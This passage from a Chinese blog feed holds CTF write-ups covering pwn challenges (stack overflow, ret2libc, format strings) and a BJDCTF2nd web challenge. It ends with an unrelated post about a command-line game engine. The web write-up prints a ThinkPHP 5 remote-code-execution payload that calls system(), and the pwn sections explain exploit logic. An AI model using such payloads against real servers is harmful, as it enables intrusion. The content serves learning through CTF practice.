data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.11.png" class="lazyload" title="main"></a></p><p>建立了三个缓冲区，调用了hello函数，进hello函数看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.22.png" data-fancybox="group" data-caption="hello" class="fancybox"><img alt="hello" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.22.png" class="lazyload" title="hello"></a></p><p>有一段复杂的代码，暂时不知道是干什么的，下面是两次输入，第一次是对输入有限制的输入，第二次用的是危险的gets函数。</p><p>变量name</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.13.08.png" data-fancybox="group" data-caption="name" class="fancybox"><img alt="name" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.13.08.png" class="lazyload" title="name"></a></p><p>看函数列表</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.37.png" data-fancybox="group" data-caption="list" class="fancybox"><img alt="list" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.37.png" class="lazyload" title="list"></a></p><p>还有一个pwn函数，里面调用了system函数。</p><p>那么我们的思路就有了，把gets函数的返回地址覆盖为_system的地址，在输入名字的时候输入/bin/sh，让shellcode执行就可以了。</p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.14.49.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.14.49.png" class="lazyload" title="exp"></a></p><p>_shstr是shellcode的储存地址，p32(1)是调用_system时要覆盖的返回地址，随便写一个就可以。</p><p>运行即可Get Shell。</p><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>连接题目看一下题</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%889.25.06.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%889.25.06.png" class="lazyload" title="nc"></a></p><p>文本量巨大，能看出是个rpg游戏，开头有法师说会给予你帮助，你自己打不败恶龙，然后告诉了我们两个秘密。secret是一个数组，储存了看起来像地址的数据。暂时不知道有什么用。</p><p>拖进ida分析</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.54.09.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.54.09.png" class="lazyload" title="main"></a></p><p>在main函数可以看到v3被赋值给了v4，v3是malloc申请的一个8bit空间的地址，再根据下面的输出，可以推断出，v3就是secret。</p><p>再跟踪到sub_400D72</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.26.08.png" data-fancybox="group" data-caption="1" class="fancybox"><img alt="1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.26.08.png" class="lazyload" title="1"></a></p><p>注意到23行存在格式化字符串漏洞。暂时还不知道利用它可以干嘛。返回然后进入sub_400CA6，传入的参数a1就是secret，也就是main函数里的v3。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.27.37.png" data-fancybox="group" data-caption="2" class="fancybox"><img alt="2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.27.37.png" class="lazyload" title="2"></a></p><p>在最后的if部分可以看到，使secret[0]和secret[1]两个地址指向的值相等就可以获得法师的帮助，v1在17行强制转换成了一个函数指针并执行指向的函数。</p><p>所以我们的攻击思路就是，利用格式化字符串漏洞把secret[0]值修改为85使if成立，然后输入shellcode就可以get shell了。</p><p>exp</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.25.17.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.25.17.png" class="lazyload" title="exp"></a></p><p>要覆盖的值的地址在payload发送前写入栈，然后利用漏洞修改这个地址的值。paylaod中的&#39;7&#39;是试验出的结果，前一次输入的地址被保存在了步长为7的位置。</p><p><em>本题要感谢<strong>不会修电脑</strong>师傅的指点</em></p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>直接拖进IDA分析</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" class="lazyload" title="main"></a></p><p>没什么东西，去看vulnerable_function</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" data-fancybox="group" data-caption="vf" class="fancybox"><img alt="vf" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" class="lazyload" title="vf"></a></p><p>第6行调用了read读取了0x100byte，但是buf只有0x88byte，存在栈溢出漏洞。但是并没有system函数可以利用，而是给了libc，所以是ret2libc。我们要从libc中载入system和/bin/sh，就要先获得它们的got地址。</p><p><strong>攻击思路：</strong>先泄漏write函数（read函数亦可）的got地址，然后减去write函数在libc中的地址，就能得到offset（偏移），那么由于libc中的地址相对固定，就可以根据&#39;libc地址+offset=got地址&#39;算出system函数和/bin/sh的got地址。</p><p>有了这两个地址，就可以当普通的栈溢出做了。</p><p>完整exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%881.40.23.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%881.40.23.png" class="lazyload" title="exp"></a></p><p>需要注意的是，如果PIE保护开启，offset将是动态的，就不能通过计算一个函数的offset去推算其他函数。</p><p>此外，两次payload必须在同一次程序运行过程中完成，不能分成第一次运行获得地址，第二次运行执行栈溢出攻击。因为程序的每一次运行，外部函数在got表中的实际地址都是不同的，所以我们的第一个rop链中必须使程序返回到合适的位置，在上面的exp中，第一次write执行后返回到了main函数，以便可以执行第二个payload。</p><p><em>[<strong>此处是个人理解部分</strong>]</em>  在rop链中，希望调用的外部函数地址，可以是plt表中的地址，也可以是got表中的实际地址，因为plt地址指向的数据就是这个函数在got表的实际地址。</p><p><em>本题要感谢<strong>Thriumph</strong>师傅的指点</em></p><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p><em>这一题也是格式化字符串漏洞，但是比较简单，可以独立完成</em></p><p>直接ida看题</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%885.58.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%885.58.22.png" class="lazyload" title="main"></a></p><p>很直白，在23行存在格式化字符串漏洞，再看到下面的if条件，很明显是要我们利用漏洞修改pwnme的值为8.</p><p>看一下pwnme</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.25.png" data-fancybox="group" data-caption="pwnme" class="fancybox"><img alt="pwnme" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.25.png" class="lazyload" title="pwnme"></a></p><p>是全局变量，所以地址不变。</p><p>题目一共输入了两次，第一次输入在了buf缓冲区，猜测可能是要在这里输入目标地址。但是read限制读取10个字符，再看栈</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.10.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.10.png" class="lazyload" title="栈"></a></p><p>0x7E-10=0x75，正好在s变量前，所以不存在溢出，也无法利用格式化漏洞读取到。所以我们要在输入s中输入先输入地址，然后修改这个地址的值。</p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.20.14.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.20.14.png" class="lazyload" title="exp"></a></p><p>%10$n中的10是测试出来的offset。</p><p>32位的地址是32bit，也就是4个字节，经过测试，程序字符集可能是ascii或utf-8，所以4个字节就是4个字符。为了使pwnme的值为8，所以payload里多加4个a，这样最终一共输出8个字符，%10n就会把第10个位置的值赋值为8。</p><h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>学Pwn七天，学到的东西没有很多，但是原理和小细节都弄清楚了，这些漏洞的高级运用方法还要在以后认真学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;int-overflow&quot;&gt;&lt;a href=&quot;#int-overflow&quot; class=&quot;headerlink&quot; title=&quot;int_overflow&quot;&gt;&lt;/a&gt;int_overflow&lt;/h1&gt;&lt;p&gt;nc链接一下题目。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="PWN" scheme="https://cdn.n0p3.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2nd</title>
    <link href="https://cdn.n0p3.cn/2020/04/08/BJDCTF2nd/"/>
    <id>https://cdn.n0p3.cn/2020/04/08/BJDCTF2nd/</id>
    <published>2020-04-08T01:53:11.000Z</published>
    <updated>2020-07-11T10:48:54.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>BJDCTF2nd是北京工业大学的第二次新生赛。密码题比较基础，AK了，杂项解出了6题，都不难，Web解出两题，记录一下。</p><h1 id="FAKE-GOOGLE"><a href="#FAKE-GOOGLE" class="headerlink" title="FAKE GOOGLE"></a>FAKE GOOGLE</h1><p>拿到题目，界面如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.05.png" data-fancybox="group" data-caption="主页" class="fancybox"><img alt="主页" title="主页" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.05.png" class="lazyload"></a></p><p>随便输入搜索</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.30.png" data-fancybox="group" data-caption="搜索结果页面" class="fancybox"><img alt="搜索结果页面" title="搜索结果页面" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.30.png" class="lazyload"></a></p><p>直接看到回显，有可能存在xss，如果用了模板则可能有ssti</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.34.png" data-fancybox="group" data-caption="测试flask注入payload" class="fancybox"><img alt="测试flask注入payload" title="测试flask注入payload" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.34.png" class="lazyload"></a></p><p>payload测试，发现注入成功</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.43.png" data-fancybox="group" data-caption="结果" class="fancybox"><img alt="结果" title="结果" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.43.png" class="lazyload"></a></p><p>在目录中寻找flag.</p><p>Get flag.</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.59.11.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" title="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.59.11.png" class="lazyload"></a></p><h1 id="OLD-HACKER"><a href="#OLD-HACKER" class="headerlink" title="OLD HACKER"></a>OLD HACKER</h1><p>打开题目</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.08.41.png" data-fancybox="group" data-caption="主页" class="fancybox"><img alt="主页" title="主页" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.08.41.png" class="lazyload"></a></p><p>主页上没有可交互的地方，乍一看无从下手</p><p>注意到中间提示ThinkPhp5，可能是有关tp5的漏洞考察</p><p>找到tp5曾经有过一个rce漏洞，用payload测试</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure></div><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.30.18.png" data-fancybox="group" data-caption="报错信息" class="fancybox"><img alt="报错信息" title="报错信息" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.30.18.png" class="lazyload"></a></p><p>根据信息发现版本5.023</p><p>用5.023的payload</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.45.17.png" data-fancybox="group" data-caption="payload" class="fancybox"><img alt="payload" title="payload" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.45.17.png" class="lazyload"></a></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-09%20%E4%B8%8B%E5%8D%884.07.14.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" title="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-09%20%E4%B8%8B%E5%8D%884.07.14.png" class="lazyload"></a></p><p>最后调整命令get flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h1&gt;&lt;p&gt;BJDCTF2nd是北京工业大学的第二次新生赛。密码题比较基础，AK了，杂项解出了6题，都不难，Web解出两题，记录一下。&lt;/p&gt;
&lt;h1 
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>在命令行上玩出花:InfantGameEngine</title>
    <link href="https://cdn.n0p3.cn/2020/04/05/InfantGameEngine/"/>
    <id>https://cdn.n0p3.cn/2020/04/05/InfantGameEngine/</id>
    <published>2020-04-05T06:49:12.000Z</published>
    <updated>2020-07-07T14:00:50.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>InfantGameEngine，婴儿级游戏引擎，虽然它只能显示简单的游戏画面。但它可以支持你写非常复杂的游戏逻辑。</p><p>=======================================================</p><p>Tip：源码已经放在github上了，建议参照源码阅读～</p><p>项目地址：<a href="https://github.com/TOXICAKE/InfantGameEngine.git" target="_blank" rel="noopener">https://github.com/TOXICAKE/InfantGameEngine.git</a></p><p>觉得有趣的话记得给一颗星XD</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="储存字符"><a href="#储存字符" class="headerlink" title="储存字符"></a>储存字符</h2><p>显示在屏幕上的每一个字符都具有多个属性，所以可以用结构体来记录每一个字符。这样就引出了<strong>实体(Entity)</strong>这个概念，每一个字符都是Entity类的实例，称作一个实体，然后用链式结构关联每一个实体。这样只需要遍历就可以取到所有的实体，以及它们其中的数据。</p><h2 id="刷新机制"><a href="#刷新机制" class="headerlink" title="刷新机制"></a>刷新机制</h2><p>每帧都刷新显示所有字符是不可能的，所以应该采用局部刷新的方法。假如一个实体向右移动一格，那么就是在右侧输出这个实体的字符，并在原来的位置上输出被遮挡的字符。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" data-fancybox="group" data-caption="局部刷新机制" class="fancybox"><img alt="局部刷新机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" class="lazyload" title="局部刷新机制"></a></p><h2 id="碰撞机制"><a href="#碰撞机制" class="headerlink" title="碰撞机制"></a>碰撞机制</h2><p>实体应该具有一个参数<strong>碰撞(Collision)</strong>，两个有碰撞实体彼此不能穿过，两个实体间如果有至少一方是无碰撞的则它们彼此可以穿过。这就是基本的碰撞机制。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" data-fancybox="group" data-caption="简单演示一下碰撞机制" class="fancybox"><img alt="简单演示一下碰撞机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" class="lazyload" title="简单演示一下碰撞机制"></a></p><h2 id="实体组"><a href="#实体组" class="headerlink" title="实体组"></a>实体组</h2><p>显然，我们不能总是让开发者以实体为单位去开发游戏，例如马里奥是32*32像素的，程序移动马里奥是以整个马里奥为单位去移动的，我们也应该向开发者提供以组为单位的开发方式。我选用了二级链表来实现，即实体组之间连接，每个节点又是新的实体链的头节点。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%203.png" data-fancybox="group" data-caption="实体组的数据结构" class="fancybox"><img alt="实体组的数据结构" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%203.png" class="lazyload" title="实体组的数据结构"></a></p><h1 id="交付"><a href="#交付" class="headerlink" title="交付"></a>交付</h1><p>为了使游戏显示效果尽可能的好，刷新应该在移动后进行，所以刷新应该交付给各个会产生实体位置移动的函数。</p><p>碰撞检查也是发生在移动过程中的，也应该交付给各个会产生实体位置移动的函数。</p><p>实体移动到新位置时，应该要把新位置上的实体保存下来（如果有）。但除了在移动时要保存，在创建新实体时也要保存。</p><h1 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h1><h2 id="实体移动-En-Move"><a href="#实体移动-En-Move" class="headerlink" title="实体移动 En_Move"></a>实体移动 En_Move</h2><p>实体的移动是引擎最基本的功能，包括的内容很多，但是逻辑并不复杂。接受的参数应该是实体的编号（id），运动方向（direction)，距离(distance)。</p><p>首先是检查对应方向上的可移动距离。如果移动的实体本身的碰撞属性是off，则不需要考虑与其他实体的碰撞问题，只用检查移动完是否在画布内即可。如果碰撞属性是on，则循环检查时就要同时考虑检查位置上的实体碰撞属性，如果同为on，则可移动距离就是到这个实体的距离。</p><p>计算出可移动距离，如果比distance大，则可以移动distance那么远，否则的话移动到最大可移动距离停下。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%204.png" data-fancybox="group" data-caption="实体移动演示" class="fancybox"><img alt="实体移动演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%204.png" class="lazyload" title="实体移动演示"></a></p><h2 id="构成实体组-AddEnToGr"><a href="#构成实体组-AddEnToGr" class="headerlink" title="构成实体组 AddEnToGr"></a>构成实体组 AddEnToGr</h2><p>实例化一个实体组对象后，使用这个函数将一个实体加入到组中去，代码也很简单，就是普通的在实体链后面加一个节点而已。</p><h2 id="实体组移动-Gr-Move"><a href="#实体组移动-Gr-Move" class="headerlink" title="实体组移动 Gr_Move"></a>实体组移动 Gr_Move</h2><p>实体组的移动其实就是对每个实体进行实体移动而已，但实际上的代码逻辑要稍微复杂一点。</p><p>首先循环计算每一个组内实体的可移动距离，再求出其中的最小值。这个最小值就是这个实体组实际上可以移动的距离。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%205.png" data-fancybox="group" data-caption="实体组移动演示" class="fancybox"><img alt="实体组移动演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%205.png" class="lazyload" title="实体组移动演示"></a></p><p>但是，如果之间调用之前写好的实体移动函数则会出现刷新显示上的问题。</p><p>因为是顺序结构，所以实体组中的实体也是按序移动，顺序与每条AddEnToGr执行顺序一致，这样就导致如果显示位置在前（沿移动方向）的实体移动顺序排在后面，就会遮挡先前移动好的实体。如下图所示，按ABC顺序添加进组中的三个实体，向右移动一格，最后画面上只会剩下C。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%206.png" data-fancybox="group" data-caption="bug" class="fancybox"><img alt="bug" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%206.png" class="lazyload" title="bug"></a></p><p>解决办法就是等所有实体移动完后再刷新遮挡的实体，最后刷新移动后的实体。</p><h2 id="实体组旋转-Gr-Spin"><a href="#实体组旋转-Gr-Spin" class="headerlink" title="实体组旋转 Gr_Spin"></a>实体组旋转 Gr_Spin</h2><p>旋转也应该是引擎提供的功能。开发者提供旋转中心和旋转方向，就可以直接以组为单位旋转。可以简单的分为几步来实现，计算所有实体旋转后应该在的位置，然后检查移动路径上是否有阻碍，如果有，则不能旋转。确定旋转后位置的算法，（我用象棋棋盘找到的，并不复杂）。在算法上，第一步是确定实体所在的象限，再在象限内判断实体在45度线的那半边。还有特殊的实体恰好在分界线上的情况。下图是我的演草纸，动手画图找到规律就可以了。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%BC%94%E8%8D%89%E7%BA%B8.png" data-fancybox="group" data-caption="演草纸" class="fancybox"><img alt="演草纸" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%BC%94%E8%8D%89%E7%BA%B8.png" class="lazyload" title="演草纸"></a></p><p>这部分代码比较费神，实际上最后的代码应该可以优化，但是我已经没有心情去做了。</p><h1 id="API的设置"><a href="#API的设置" class="headerlink" title="API的设置"></a>API的设置</h1><p>我在开发好基本功能后就去写了小demo来测试，最后写了“七巧板”来做最终的测试，中间的api也是越加越多，除了实体的信息要有api来提供以外，总的实体数目，组的个数还有组内实体总数也都需要提供。还要可以多种方式查询，比如获得实体可以通过实体编号，也可以通过组和组内实体编号，还可以通过画布的坐标。</p><h1 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h1><p>它的实际使用效果很不错，因为我们在开发时提供的功能比较完善，没有过多的限制，并且是直接的api调用编程，比较灵活。</p><p>开发过程中最重要的是实体的管理，如果实体没有管理好，整个代码看起来就会相当糟糕。</p><p>实体就是“实际”存在的意思，他具体是什么由程序员的代码来决定。例如你可以在实体类中增加一个变量Key，程序员在设计游戏时就可以给key赋值，例如1代表构成主角的实体，2代表按钮，3代表门。</p><p>测试程序和测试源码都可以在github上找到。</p><p>=======================================================</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你大概不会真的动手去写一个，也可能会觉得它没什么用。我们是直接接触框架的一代，这些东西除了作为上学时的作业，几乎毫无用处，我们上面在讨论的东西，也是之前<strong>雅达利</strong>思考过的东西，他们当时的开发环境还要更为恶劣一些。</p><p>命令行也可以做出很有趣的游戏，画面并不是游戏的唯一要素。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" data-fancybox="group" data-caption="大灾变：劫后余生" class="fancybox"><img alt="大灾变：劫后余生" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" class="lazyload" 